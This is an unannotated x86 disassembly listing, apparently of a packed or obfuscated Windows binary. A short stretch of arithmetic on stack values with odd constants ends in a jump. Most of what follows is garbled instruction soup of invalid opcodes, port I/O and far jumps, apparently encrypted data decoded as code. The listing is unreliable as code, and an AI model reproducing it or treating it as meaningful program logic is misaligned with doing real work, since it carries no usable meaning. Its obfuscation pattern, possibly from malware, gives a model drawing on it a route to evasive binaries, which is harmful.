  413faa:	mov    DWORD PTR [ebp+0x8],edx
  413fad:	mov    edx,DWORD PTR [ebp+0x8]
  413fb0:	mov    ebx,DWORD PTR [ebp-0x58]
  413fb3:	add    edx,0x5708c4
  413fb9:	imul   edx,ebx
  413fbc:	mov    DWORD PTR [ebp-0x58],edx
  413fbf:	mov    edx,DWORD PTR [ebp+0x8]
  413fc2:	mov    ebx,DWORD PTR [ebp-0x54]
  413fc5:	add    edx,0x64f8da
  413fcb:	or     edx,ebx
  413fcd:	mov    DWORD PTR [ebp-0x54],edx
  413fd0:	mov    edx,DWORD PTR [ebp+0x8]
  413fd3:	mov    ebx,DWORD PTR [ebp-0x50]
  413fd6:	add    edx,ecx
  413fd8:	xor    edx,ebx
  413fda:	mov    DWORD PTR [ebp-0x50],edx
  413fdd:	mov    edx,DWORD PTR [ebp+0x8]
  413fe0:	mov    ebx,DWORD PTR [ebp-0x4c]
  413fe3:	add    edx,edi
  413fe5:	and    edx,ebx
  413fe7:	mov    DWORD PTR [ebp-0x4c],edx
  413fea:	mov    edx,DWORD PTR [ebp+0x8]
  413fed:	mov    ebx,DWORD PTR [ebp-0x48]
  413ff0:	lea    edx,[ebx+edx*1+0x241fc1f]
  413ff7:	mov    DWORD PTR [ebp-0x48],edx
  413ffa:	mov    edx,DWORD PTR [ebp+0x8]
  413ffd:	mov    ebx,0xfa5e15e2
  414002:	jmp    0x4163b6
  414007:	scas   eax,DWORD PTR es:[edi]
  414008:	shl    BYTE PTR [eax-0x7f],cl
  41400b:	jno    0x413f90
  41400d:	scas   eax,DWORD PTR es:[edi]
  41400e:	mov    dl,0xfb
  414010:	xor    DWORD PTR [edi-0x3e],edx
  414013:	dec    esi
  414014:	mov    ebx,0x74a259a9
  414019:	jl     0x414097
  41401b:	jmp    0x41407c
  41401d:	jl     0x41409b
  41401f:	popa   
  414020:	jg     0x413fe6
  414022:	imul   esp,ebp,0xa0d18e81
  414028:	push   esi
  414029:	stos   DWORD PTR es:[edi],eax
  41402a:	and    bl,BYTE PTR [esp+esi*2+0x24]
  41402e:	sub    DWORD PTR [edi],ecx
  414030:	bound  ecx,QWORD PTR ds:0xd91dfacb
  414036:	add    DWORD PTR [ebx+0x7e],esi
  414039:	pusha  
  41403a:	fiadd  WORD PTR [ebx]
  41403c:	jnp    0x4140b4
  41403e:	mov    WORD PTR [ebp+0x71],fs
  414041:	mov    esp,0x90a33e62
  414046:	out    dx,eax
  414047:	ss aaa 
  414049:	sub    eax,0x56f5c626
  41404e:	jb     0x4140b4
  414050:	out    0x94,al
  414052:	dec    ebx
  414053:	cmp    al,0x2
  414055:	push   edi
  414056:	lods   al,BYTE PTR ds:[esi]
  414057:	xor    edi,0xaa3ea073
  41405d:	sub    DWORD PTR [ebx+edx*8-0x68],edx
  414061:	dec    esp
  414062:	repnz aas 
  414064:	in     eax,dx
  414065:	sub    al,0x16
  414067:	adc    DWORD PTR [ebp-0x282321c9],edi
  41406d:	popa   
  41406e:	sbb    al,BYTE PTR [ebp+0x70]
  414071:	push   esi
  414072:	push   0x78
  414074:	sbb    esi,esi
  414076:	mov    al,0xc2
  414078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414079:	das    
  41407a:	push   esp
  41407b:	into   
  41407c:	jg     0x4140b2
  41407e:	(bad)  
  414080:	repnz fnstenv fs:[ebp+0x62c6c49]
  414088:	test   DWORD PTR [eax],ebp
  41408a:	adc    al,0x77
  41408c:	maxps  xmm7,XMMWORD PTR [ebx+0x69]
  414090:	stc    
  414091:	fdivr  QWORD PTR [esi+0x44]
  414094:	mov    esi,0x193b9a26
  414099:	push   es
  41409a:	add    eax,0xa7aeb0c6
  41409f:	adc    ebx,0xffffff94
  4140a2:	xchg   edi,eax
  4140a3:	imul   esp,DWORD PTR [esi-0x6b],0xcbdb89aa
  4140aa:	ja     0x4140f1
  4140ac:	repnz push ss
  4140ae:	and    DWORD PTR [edx],0xffffffe9
  4140b1:	push   edi
  4140b2:	push   ebp
  4140b3:	dec    edi
  4140b4:	aad    0xfc
  4140b6:	xchg   DWORD PTR [ebx],esi
  4140b8:	inc    di
  4140ba:	xor    dl,0x1e
  4140bd:	loop   0x4140e2
  4140bf:	mov    esp,0xd6c0bc07
  4140c4:	push   eax
  4140c5:	lock jne 0x414110
  4140c8:	or     eax,0x4b1c7f5
  4140cd:	fnsave [ecx-0x1d]
  4140d0:	sub    eax,0xc9d6c2a3
  4140d5:	rcl    BYTE PTR [ecx+esi*1],cl
  4140d8:	jle    0x414090
  4140da:	iret   
  4140db:	jecxz  0x41413c
  4140dd:	pop    eax
  4140de:	retf   
  4140df:	or     DWORD PTR [ecx-0x37],0x37
  4140e3:	dec    esi
  4140e4:	jae    0x4140ec
  4140e6:	addr16 popf 
  4140e8:	push   ds
  4140e9:	fisub  DWORD PTR [edi-0x60]
  4140ec:	dec    esi
  4140ed:	mov    eax,0xe217fdfe
  4140f2:	repz (bad) 
  4140f4:	in     al,0x6a
  4140f6:	daa    
  4140f7:	in     al,dx
  4140f8:	and    eax,0xded1c710
  4140fd:	mov    ds:0xae7e86dd,eax
  414102:	popf   
  414103:	ficom  DWORD PTR ds:[edi]
  414106:	push   0x5fdcb590
  41410b:	and    al,0x90
  41410d:	iret   
  41410e:	sar    BYTE PTR [ebp-0x64],cl
  414111:	pop    esi
  414112:	mov    ch,0xcd
  414114:	cmp    al,0x84
  414116:	(bad)
  414119:	popf   
  41411a:	lea    bx,[ecx+eax*4]
  41411e:	inc    ebp
  41411f:	jb     0x4140a4
  414121:	jmp    0x41410b
  414123:	pop    es
  414124:	mov    dl,0x2c
  414126:	in     al,dx
  414127:	sbb    eax,DWORD PTR [ecx]
  414129:	mov    WORD PTR [ecx-0x27700cf4],cs
  41412f:	fbld   TBYTE PTR [ecx]
  414131:	retf   
  414132:	int3   
  414133:	test   BYTE PTR [edx-0x2a2359bf],cl
  414139:	gs enter 0xd1bc,0x1d
  41413e:	sahf   
  41413f:	lea    eax,[edx+0x2]
  414142:	cmc    
  414143:	cmp    eax,0x81360d85
  414148:	and    eax,0x9b0072d5
  41414d:	aaa    
  41414e:	dec    ebp
  41414f:	cmp    al,0x2a
  414151:	xor    ebp,DWORD PTR [ebx-0x1727eb12]
  414157:	add    BYTE PTR [edi-0x32],0xa0
  41415b:	out    0xc3,al
  41415d:	cmp    esi,DWORD PTR [esi]
  41415f:	lock mov al,ds:0x7f146e94
  414165:	dec    eax
  414166:	pushf  
  414167:	add    eax,DWORD PTR [ebp-0x31]
  41416a:	xchg   edx,eax
  41416b:	ror    ebx,0xc6
  41416e:	in     eax,dx
  41416f:	retf   
  414170:	(bad)  
  414171:	pop    edi
  414172:	cmp    al,0xb2
  414174:	arpl   WORD PTR [esi+0x22dfc064],ax
  41417a:	sub    dh,BYTE PTR [ebp-0x1b5889de]
  414180:	dec    esi
  414181:	repz pop ebx
  414183:	fidivr WORD PTR [edx]
  414185:	cli    
  414186:	mov    dl,0xc9
  414188:	add    eax,0x5c7b9431
  41418d:	xor    esi,esp
  41418f:	bound  ebp,QWORD PTR [ebx-0x13]
  414192:	aas    
  414193:	mov    eax,ds:0xa3ba7cd2
  414198:	jge    0x4141f4
  41419a:	mov    al,ds:0xab7b2b0
  41419f:	pushf  
  4141a0:	mov    esp,0xd156a8a7
  4141a5:	mov    ah,0x54
  4141a7:	dec    edx
  4141a8:	bound  ebx,QWORD PTR [esi]
  4141aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ab:	xchg   esi,eax
  4141ac:	inc    edi
  4141ad:	retf   0x91b3
  4141b0:	test   al,0xa5
  4141b2:	jbe    0x414135
  4141b4:	shl    cl,0xf4
  4141b7:	fstp   DWORD PTR [edi-0x5f5e61b4]
  4141bd:	shr    DWORD PTR [ebx-0x23370909],cl
  4141c3:	push   ecx
  4141c4:	bound  edx,QWORD PTR [edi+0x62]
  4141c7:	and    edi,esi
  4141c9:	out    dx,al
  4141ca:	sub    BYTE PTR [edi],dl
  4141cc:	cwde   
  4141cd:	push   0xffffffcd
  4141cf:	pop    es
  4141d0:	pop    edi
  4141d1:	retf   0xaf2f
  4141d4:	jns    0x414241
  4141d6:	jecxz  0x414223
  4141d8:	je     0x41418b
  4141da:	xchg   ecx,eax
  4141db:	pop    esp
  4141dc:	dec    esp
  4141dd:	push   ecx
  4141de:	sub    al,0xeb
  4141e0:	scas   al,BYTE PTR es:[edi]
  4141e1:	add    ch,BYTE PTR [ecx-0x338fd4d6]
  4141e7:	imul   esp,edi,0x40
  4141ea:	iret   
  4141eb:	sub    DWORD PTR [ebx],esp
  4141ed:	sbb    ebx,esi
  4141ef:	aaa    
  4141f0:	mov    cl,0x16
  4141f2:	data16 shr al,0xd1
  4141f6:	mov    ecx,0x63a9bb95
  4141fb:	sar    ch,0xbe
  4141fe:	cwde   
  4141ff:	int    0xe8
  414201:	and    esp,DWORD PTR [edi]
  414203:	cmp    ch,BYTE PTR [edx-0x49]
  414206:	xchg   edx,eax
  414207:	test   eax,0x4516c3c2
  41420c:	dec    ebx
  41420d:	stos   BYTE PTR es:[edi],al
  41420e:	mov    eax,DWORD PTR [ebp+edi*4-0x7c]
  414212:	jno    0x414209
  414214:	test   eax,0xb1ee0796
  414219:	pop    ds
  41421a:	adc    eax,ecx
  41421c:	add    al,0x51
  41421e:	fsubr  DWORD PTR [ebx-0x10f5498b]
  414224:	inc    esp
  414225:	in     eax,0xbd
  414227:	mov    dl,0x74
  414229:	shr    DWORD PTR [esp+ecx*4],1
  41422c:	cmc    
  41422d:	(bad)  
  41422e:	imul   esi,DWORD PTR [ebp-0x1612e358],0xffffffcb
  414235:	mov    edi,0xde517a65
  41423a:	jge    0x4141f6
  41423c:	out    dx,eax
  41423d:	jne    0x41426b
  41423f:	stc    
  414240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414241:	pop    ebx
  414242:	pop    ebx
  414243:	and    DWORD PTR [esi-0x19],edi
  414246:	test   BYTE PTR [edx+0x69],dh
  414249:	aas    
  41424a:	mov    ebx,0xeda519b9
  41424f:	popf   
  414250:	push   edx
  414251:	(bad)  
  414252:	mov    ds:0x9960ebff,eax
  414257:	sub    bl,BYTE PTR [esi]
  414259:	aad    0x45
  41425b:	shr    BYTE PTR [edx],0xe5
  41425e:	test   eax,edi
  414260:	xchg   ebx,eax
  414261:	mov    bl,0xb2
  414263:	icebp  
  414264:	test   al,0x95
  414266:	out    0x78,eax
  414268:	data16 jp 0x4142b6
  41426b:	pop    eax
  41426c:	test   eax,0x1a606cbc
  414271:	outs   dx,DWORD PTR ds:[esi]
  414272:	push   esp
  414273:	push   esp
  414274:	pop    edx
  414275:	test   eax,0x2e74fc03
  41427a:	hlt    
  41427b:	inc    esp
  41427c:	setp   BYTE PTR [ebp+eax*4+0x4117b22d]
  414284:	pop    ebp
  414285:	int    0x30
  414287:	out    0x3b,eax
  414289:	sar    DWORD PTR [ebx],1
  41428b:	or     dl,BYTE PTR [edx+0x5c]
  41428e:	leave  
  41428f:	add    eax,0xabb9f666
  414294:	daa    
  414295:	dec    edx
  414296:	shl    BYTE PTR [edx+0xf],1
  414299:	ins    DWORD PTR es:[edi],dx
  41429a:	addr16 int3 
  41429c:	bound  ebx,QWORD PTR [ebx+0x372f4e6c]
  4142a2:	loope  0x414238
  4142a4:	push   es
  4142a5:	nop
  4142a6:	sti    
  4142a7:	dec    ebx
  4142a8:	call   0xfa61fe66
  4142ad:	nop
  4142ae:	cmp    al,0x32
  4142b0:	inc    esp
  4142b1:	mov    ebp,0x72a0ca4b
  4142b6:	scas   al,BYTE PTR es:[edi]
  4142b7:	mov    ebx,0xc0c7e4f3
  4142bc:	daa    
  4142bd:	movlps QWORD PTR [eax+0x7404c082],xmm0
  4142c4:	shl    BYTE PTR [esp+esi*1],1
  4142c7:	mov    ecx,0x67de29d8
  4142cc:	das    
  4142cd:	xchg   edx,eax
  4142ce:	mov    eax,0x20cf81a3
  4142d3:	ins    DWORD PTR es:[edi],dx
  4142d4:	pop    eax
  4142d5:	ins    BYTE PTR es:[edi],dx
  4142d6:	dec    esp
  4142d7:	or     dl,bh
  4142d9:	dec    eax
  4142da:	imul   ecx,DWORD PTR [edx],0x5548c1bd
  4142e0:	push   ecx
  4142e1:	inc    ebx
  4142e2:	loop   0x4142c8
  4142e4:	push   0x7f
  4142e6:	adc    DWORD PTR [edi],eax
  4142e8:	and    al,BYTE PTR [eax-0x4e]
  4142eb:	mov    cl,0xcc
  4142ed:	cdq    
  4142ee:	je     0x4142aa
  4142f0:	jmp    0x4142b4
  4142f2:	jl     0x4142a5
  4142f4:	(bad)  
  4142f5:	das    
  4142f6:	iret   
  4142f7:	or     bh,BYTE PTR [edx+eax*2+0x1d]
  4142fb:	adc    eax,0xaf71cc6b
  414300:	dec    eax
  414301:	rcr    BYTE PTR [ebp-0x6b],0x5d
  414305:	xor    ch,bh
  414307:	mov    ?,esp
  414309:	add    DWORD PTR [ecx+0x176c27b0],ebp
  41430f:	jno    0x414369
  414311:	mov    eax,ds:0x2437f399
  414316:	dec    esp
  414317:	inc    esp
  414318:	jno    0x41434d
  41431a:	jl     0x4142ce
  41431c:	out    dx,eax
  41431d:	and    ebp,DWORD PTR [eax+0x50]
  414320:	sub    eax,DWORD PTR [ebx]
  414322:	mov    eax,ds:0x185fd9d7
  414327:	mov    eax,0x93656cac
  41432c:	dec    ebp
  41432d:	lds    eax,FWORD PTR [bx+di-0x1b]
  414331:	inc    esi
  414332:	xor    DWORD PTR [esi-0x6c48bcdd],ebx
  414338:	mov    edx,0x82617d38
  41433d:	or     cl,cl
  41433f:	mov    ds:0x1f4cb5ec,al
  414344:	mov    bl,0xf8
  414346:	mov    bh,0x0
  414348:	push   edi
  414349:	loopne 0x41436a
  41434b:	in     eax,dx
  41434c:	retf   0x5769
  41434f:	mov    DWORD PTR [ecx-0x42],0xb4b864e0
  414356:	fbld   TBYTE PTR [ebx+0x9]
  414359:	out    0x60,eax
  41435b:	mov    edx,0x295e6176
  414360:	sbb    DWORD PTR [edi-0x53c69027],ecx
  414366:	cmp    eax,DWORD PTR [ebx-0x38]
  414369:	push   edi
  41436a:	mov    eax,0xb7771a76
  41436f:	add    cl,BYTE PTR [edi-0x6]
  414372:	mov    fs,WORD PTR [esi+0x602712e8]
  414378:	and    eax,0x1e13098e
  41437d:	xor    ah,BYTE PTR [edi]
  41437f:	xchg   esi,eax
  414380:	lods   al,BYTE PTR ds:[esi]
  414381:	outs   dx,DWORD PTR ds:[esi]
  414382:	mov    gs,WORD PTR [esi]
  414384:	sbb    DWORD PTR [esi+0x49],eax
  414387:	mov    ebx,0x34d24134
  41438c:	ins    DWORD PTR es:[edi],dx
  41438d:	dec    eax
  41438e:	inc    edi
  41438f:	pop    es
  414390:	and    DWORD PTR [esi],esp
  414392:	(bad)  
  414393:	xor    BYTE PTR [edx-0xe766394],dl
  414399:	nop
  41439a:	mov    dl,0xd4
  41439c:	dec    eax
  41439d:	ja     0x414404
  41439f:	mov    al,ds:0x1326578c
  4143a4:	cmp    dl,BYTE PTR [esi+0x42d99a7]
  4143aa:	(bad)  
  4143ab:	cmp    esi,DWORD PTR [ebp+0x38b4c799]
  4143b1:	retf   0x8ffb
  4143b4:	daa    
  4143b5:	je     0x414343
  4143b7:	test   eax,0xd68a162c
  4143bc:	xlat   BYTE PTR ds:[ebx]
  4143bd:	dec    ebx
  4143be:	dec    ebx
  4143bf:	dec    ecx
  4143c0:	push   ecx
  4143c1:	and    eax,0xe09ddc53
  4143c6:	repnz jmp 0xa027:0x5c5c9ef9
  4143ce:	fbstp  TBYTE PTR [edi]
  4143d0:	ds pop es
  4143d2:	call   0x89bc:0x65cf083f
  4143d9:	mov    dh,0x9f
  4143db:	jg     0x414449
  4143dd:	(bad)  
  4143de:	data16 mov bl,0x8a
  4143e1:	pop    ebx
  4143e2:	retf   
  4143e3:	inc    ebx
  4143e4:	in     al,0x37
  4143e6:	pushf  
  4143e7:	aad    0xe3
  4143e9:	push   ds
  4143ea:	xor    ebx,DWORD PTR [eax-0x57]
  4143ed:	xchg   DWORD PTR [esi+edi*1-0x1d],edi
  4143f1:	jbe    0x414413
  4143f3:	arpl   WORD PTR [esi+0x64],dx
  4143f6:	gs xchg esi,eax
  4143f8:	shr    al,0x4a
  4143fb:	aad    0x4c
  4143fd:	xor    al,0xb6
  4143ff:	cmp    BYTE PTR [eax+0xd],bh
  414402:	or     eax,DWORD PTR [ebp+ecx*1-0x19]
  414406:	repnz push ds
  414408:	and    eax,0x43cc5455
  41440d:	lea    ecx,[ebp+0x1ccd2869]
  414413:	outs   dx,DWORD PTR ds:[esi]
  414414:	add    al,0x4f
  414416:	or     eax,0xab81ad0b
  41441b:	or     bh,bl
  41441d:	popf   
  41441e:	out    dx,al
  41441f:	aaa    
  414420:	pop    ebp
  414421:	(bad)  
  414422:	dec    ebx
  414423:	sbb    dl,BYTE PTR [edi+0x650968cc]
  414429:	mov    DWORD PTR [ebp-0x97cfdbc],edi
  41442f:	ja     0x4144a0
  414431:	inc    esp
  414432:	xchg   esp,eax
  414433:	out    0x1b,al
  414435:	add    DWORD PTR [edx+0x2c],ebp
  414438:	jmp    0x7a94:0x3db2a495
  41443f:	pop    ss
  414440:	cli    
  414441:	(bad)  
  414442:	cmc    
  414443:	mov    fs,WORD PTR [ebp+0x18527ff6]
  414449:	pop    ss
  41444a:	xchg   DWORD PTR [esi+0x37],ebx
  41444d:	lds    edi,FWORD PTR [edi+eiz*2+0x6f393694]
  414454:	stos   DWORD PTR es:[edi],eax
  414455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414456:	and    al,0xa0
  414458:	dec    edx
  414459:	fisttp QWORD PTR [ebp-0x55]
  41445c:	adc    ecx,DWORD PTR [eax+0x13a63c29]
  414462:	(bad)  
  414463:	mov    bl,0x5f
  414465:	fnstcw WORD PTR [ebx]
  414467:	or     ah,BYTE PTR [ecx]
  414469:	cli    
  41446a:	test   al,0xd8
  41446c:	ret    
  41446d:	dec    eax
  41446e:	les    esi,FWORD PTR [esi-0x482fec95]
  414474:	dec    ebp
  414475:	cmp    DWORD PTR [esi],ebx
  414477:	pop    ebp
  414478:	pushaw 
  41447a:	outs   dx,BYTE PTR ds:[esi]
  41447b:	outs   dx,BYTE PTR ds:[esi]
  41447c:	sbb    bh,0xea
  41447f:	cmp    ch,BYTE PTR [ebp+0xf788f12]
  414485:	out    dx,eax
  414486:	cmp    ah,BYTE PTR [edx]
  414488:	out    dx,al
  414489:	push   ss
  41448a:	pusha  
  41448b:	clc    
  41448c:	adc    ah,BYTE PTR [ebx-0x54620bcd]
  414492:	ret    
  414493:	pop    ecx
  414494:	rcr    bh,1
  414496:	stos   BYTE PTR es:[edi],al
  414497:	mov    dl,0x39
  414499:	pop    esp
  41449a:	xchg   DWORD PTR [esi],edx
  41449c:	ds in  al,0xfe
  41449f:	retf   0x8a44
  4144a2:	addr16 pop edi
  4144a4:	sbb    dh,ch
  4144a6:	daa    
  4144a7:	sbb    eax,0x5be07d97
  4144ac:	xlat   BYTE PTR ds:[ebx]
  4144ad:	or     esi,DWORD PTR [edi+0x38c85506]
  4144b3:	adc    eax,0x3e5404f8
  4144b8:	pop    esi
  4144b9:	into   
  4144ba:	jmp    0x547842b2
  4144bf:	jbe    0x41447e
  4144c1:	xchg   edi,eax
  4144c2:	and    ebp,DWORD PTR [edx]
  4144c4:	inc    edi
  4144c5:	sub    BYTE PTR [esi+0x50],al
  4144c8:	dec    edi
  4144c9:	xor    cl,bh
  4144cb:	jns    0x41451a
  4144cd:	and    al,0xef
  4144d0:	lods   eax,DWORD PTR ds:[esi]
  4144d1:	mov    esp,0xb92be8b9
  4144d6:	sbb    cl,BYTE PTR ss:[edi+0x5ec806f8]
  4144dd:	std    
  4144de:	mov    bl,ch
  4144e0:	enter  0x48c8,0xf8
  4144e4:	in     eax,dx
  4144e5:	xchg   ecx,eax
  4144e6:	outs   dx,BYTE PTR ds:[esi]
  4144e7:	cld    
  4144e8:	xchg   ebx,eax
  4144e9:	jo     0x4144d4
  4144eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ec:	stos   DWORD PTR es:[edi],eax
  4144ed:	push   es
  4144ee:	pop    ebx
  4144ef:	push   edx
  4144f0:	or     al,0x19
  4144f2:	xchg   esi,eax
  4144f3:	adc    BYTE PTR [ebx],ch
  4144f5:	inc    eax
  4144f6:	and    ecx,DWORD PTR [eax-0x3526ad13]
  4144fc:	icebp  
  4144fd:	test   DWORD PTR [edi],ebp
  4144ff:	icebp  
  414500:	push   0x805e18cb
  414505:	mov    ss,WORD PTR [ebx-0x63cbcb0f]
  41450b:	mov    eax,0x52051396
  414510:	rol    ebx,cl
  414512:	mov    edi,0xc3a6155f
  414517:	call   0x4773:0xb4437a8
  41451e:	jg     0x41455d
  414520:	in     eax,dx
  414521:	xor    eax,0x19046146
  414526:	mov    ecx,0x6301c5c1
  41452b:	stos   BYTE PTR es:[edi],al
  41452c:	fs xor al,0x41
  41452f:	mov    eax,cs
  414531:	xchg   edi,eax
  414532:	inc    ecx
  414533:	outs   dx,DWORD PTR ds:[esi]
  414534:	mov    al,ds:0x5e7942ab
  414539:	dec    ebx
  41453a:	in     eax,0xd5
  41453c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41453d:	mov    ds:0xe4536a3c,eax
  414542:	or     esi,edx
  414544:	cmp    eax,0x10eb1a95
  414549:	test   al,0xa3
  41454b:	retf   0xb146
  41454e:	sbb    eax,0xaccfbccf
  414553:	stc    
  414554:	pop    ecx
  414555:	push   ebx
  414556:	mov    ebx,0xc1f96872
  41455b:	js     0x41452f
  41455d:	mov    ebp,0x2d4b9afd
  414562:	jae    0x414565
  414564:	(bad)  
  414565:	xchg   ebx,eax
  414566:	es pop esi
  414568:	loop   0x41454f
  41456a:	sub    esi,DWORD PTR ds:0xf3d041d0
  414570:	aaa    
  414571:	jmp    FWORD PTR [ebx-0x207e24bf]
  414577:	int3   
  414578:	sbb    bh,BYTE PTR [eax-0x13d28789]
  41457e:	inc    ebp
  41457f:	jmp    0xe224b87e
  414584:	cmp    BYTE PTR [ebx-0xfbf6ed7],al
  41458a:	push   eax
  41458b:	aam    0x91
  41458d:	int    0xf2
  41458f:	mov    ebx,ss
  414591:	pop    ds
  414592:	int3   
  414593:	ret    0xbef8
  414596:	out    dx,eax
  414597:	or     eax,0x9260e707
  41459c:	fisubr WORD PTR [esi-0x26e6f70b]
  4145a2:	das    
  4145a3:	and    BYTE PTR [edi+edi*4+0x47ef911a],dh
  4145aa:	int3   
  4145ab:	xor    dh,ch
  4145ad:	arpl   WORD PTR [ebx*2-0x610dd52b],dx
  4145b4:	adc    al,BYTE PTR [ebx]
  4145b6:	mov    esi,0xa0af64a3
  4145bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145bc:	(bad)  
  4145bd:	stos   DWORD PTR es:[edi],eax
  4145be:	push   ecx
  4145bf:	out    0xa,al
  4145c1:	outs   dx,BYTE PTR ds:[esi]
  4145c2:	mov    ds:0x81b243cd,al
  4145c7:	inc    ecx
  4145c8:	js     0x414632
  4145ca:	jp     0x4145f1
  4145cc:	push   esi
  4145cd:	fdiv   DWORD PTR [ecx-0x311a5f12]
  4145d3:	sbb    ax,0xec7c
  4145d7:	leave  
  4145d8:	ss pusha 
  4145da:	retf   0xb617
  4145dd:	push   ebx
  4145de:	and    eax,0xa31a79e6
  4145e3:	and    DWORD PTR ss:[ebx-0x42],0xa95edbbd
  4145eb:	jns    0x4145f9
  4145ed:	cmp    DWORD PTR [ebx],ebp
  4145ef:	sahf   
  4145f0:	pushf  
  4145f1:	cs add al,0xe
  4145f4:	push   cs
  4145f5:	cmp    ebp,DWORD PTR ds:0x14b05b1a
  4145fb:	add    eax,0xb9cb787e
  414600:	fcmovnbe st,st(0)
  414602:	xor    al,0xd2
  414604:	sbb    edx,DWORD PTR [ebp+0x67ce4983]
  41460a:	lods   al,BYTE PTR ds:[esi]
  41460b:	(bad)  
  41460c:	or     DWORD PTR [esi+0x3a],eax
  41460f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414610:	mov    al,0x12
  414612:	and    bl,BYTE PTR [edx+0x48770920]
  414618:	inc    esp
  414619:	bound  ebp,QWORD PTR ds:0x57204be9
  41461f:	push   0xba8dc21d
  414624:	arpl   WORD PTR [edx],ax
  414626:	fs mov edi,0x27365879
  41462c:	test   al,0xf0
  41462e:	jnp    0x414629
  414630:	out    0x1f,al
  414632:	jns    0x41460e
  414634:	cmp    eax,DWORD PTR [ebp-0xe]
  414637:	in     al,0x84
  414639:	xor    edx,DWORD PTR [edx+0x58]
  41463c:	jg     0x414606
  41463e:	cli    
  41463f:	sbb    al,0x58
  414641:	into   
  414642:	ret    0x6b43
  414645:	mov    cl,0x17
  414647:	fisubr DWORD PTR [ebp-0x5a]
  41464a:	xchg   esi,eax
  41464b:	cmp    cl,dl
  41464d:	mov    ds:0x2504e9a1,al
  414652:	inc    esp
  414653:	in     al,dx
  414654:	or     dh,ah
  414656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414657:	in     eax,dx
  414658:	mov    bh,0x77
  41465a:	lock sub al,0xdd
  41465d:	daa    
  41465e:	stos   BYTE PTR es:[edi],al
  41465f:	xor    ebp,eax
  414661:	sahf   
  414662:	shl    DWORD PTR [esi],0xbf
  414665:	repnz hlt 
  414667:	call   0x5ee50b68
  41466c:	enter  0x368a,0xd5
  414670:	add    BYTE PTR [esi-0x66],dh
  414673:	dec    ebx
  414674:	dec    edx
  414675:	ret    
  414676:	in     eax,0x28
  414678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414679:	add    esp,DWORD PTR [edx]
  41467b:	mov    dl,0x87
  41467d:	pushf  
  41467e:	sahf   
  41467f:	repz stc 
  414681:	jle    0x4146b9
  414683:	hlt    
  414684:	ror    ebp,cl
  414686:	sub    esi,ebp
  414688:	inc    ecx
  414689:	pop    ecx
  41468a:	imul   eax,DWORD PTR [edi-0x53],0xdea02d5e
  414691:	push   esi
  414692:	dec    esp
  414693:	sbb    DWORD PTR [ecx+0x61d41391],ebx
  414699:	mov    ebx,0x4a0050a7
  41469e:	arpl   WORD PTR [ebx],dx
  4146a0:	out    dx,al
  4146a1:	aam    0x3c
  4146a3:	mov    bl,0x9a
  4146a5:	stc    
  4146a6:	les    esi,FWORD PTR [esi-0x6d2383ef]
  4146ac:	xor    al,0x9
  4146ae:	(bad)  
  4146af:	ss fs jne 0x41465c
  4146b3:	inc    edx
  4146b4:	jp     0x41468d
  4146b6:	and    DWORD PTR [ecx+0x5a44154d],edi
  4146bc:	or     eax,0xcc193a40
  4146c1:	jge    0x4146e5
  4146c3:	sub    bl,al
  4146c5:	int    0xb2
  4146c7:	mov    ebp,0x27615531
  4146cc:	scas   al,BYTE PTR es:[edi]
  4146cd:	jp     0x4146d4
  4146cf:	imul   ecx,DWORD PTR [eax+0x46],0x677a1dd5
  4146d6:	popf   
  4146d7:	jne    0x41471a
  4146d9:	dec    esp
  4146da:	(bad)  
  4146db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146dc:	cmp    BYTE PTR [ebx+0x4],dh
  4146df:	inc    BYTE PTR [ecx-0x545b6794]
  4146e5:	popa   
  4146e6:	dec    edi
  4146e7:	iret   
  4146e8:	sti    
  4146e9:	xchg   BYTE PTR ds:0x45cf070a,ah
  4146ef:	gs enter 0x2c24,0xd
  4146f4:	sbb    DWORD PTR [edx+0xc],0xeec420e7
  4146fb:	mov    ecx,0x18a71280
  414700:	push   eax
  414701:	sar    bl,cl
  414703:	inc    ebx
  414704:	stos   BYTE PTR es:[edi],al
  414705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414707:	clc    
  414708:	adc    DWORD PTR [ebp+0x50],ebx
  41470b:	lds    ecx,FWORD PTR fs:[esi+0x7fcb1cae]
  414712:	call   0x82bf:0x4ab11d47
  414719:	dec    esp
  41471a:	leave  
  41471b:	inc    edi
  41471c:	pop    esp
  41471d:	mov    cl,0xfd
  41471f:	and    al,BYTE PTR [ecx+0xf62c9c]
  414725:	popf   
  414726:	jl     0x41471e
  414728:	lods   eax,DWORD PTR ds:[esi]
  414729:	add    DWORD PTR [edi-0x90cf49f],ecx
  41472f:	mov    edx,0x9853b1c0
  414734:	pop    ds
  414735:	mov    ah,0x5
  414737:	dec    eax
  414738:	or     edi,edx
  41473a:	fnstenv [edx-0x7c]
  41473d:	push   edx
  41473e:	test   DWORD PTR ds:0xd9054263,ebx
  414744:	call   0xc15e:0xa8cc5f5e
  41474b:	and    BYTE PTR [eax],0x58
  41474e:	repz push edx
  414750:	xchg   bl,dh
  414752:	ins    DWORD PTR es:[edi],dx
  414753:	mov    bh,0x9d
  414755:	push   edx
  414756:	xchg   cl,bl
  414758:	call   0xabe3:0x3ac8813
  41475f:	add    BYTE PTR [ecx],0xdb
  414762:	pop    edx
  414763:	and    dh,bl
  414765:	inc    eax
  414766:	jmp    0x8a5c:0xece99cee
  41476d:	hlt    
  41476e:	add    dh,BYTE PTR ds:0xf7e2bdad
  414774:	or     BYTE PTR [edx+0xb63c6ce],ah
  41477a:	loop   0x4147d6
  41477c:	dec    esp
  41477d:	pop    ebp
  41477e:	mov    bh,0xd5
  414780:	cli    
  414781:	jae    0x4147e2
  414783:	cmp    ecx,DWORD PTR [ecx+esi*1-0x41ee0256]
  41478a:	sub    BYTE PTR ds:0x33f697ec,cl
  414790:	dec    eax
  414791:	sbb    BYTE PTR [edi-0x4f94cd9d],bh
  414797:	rcr    ch,0xb8
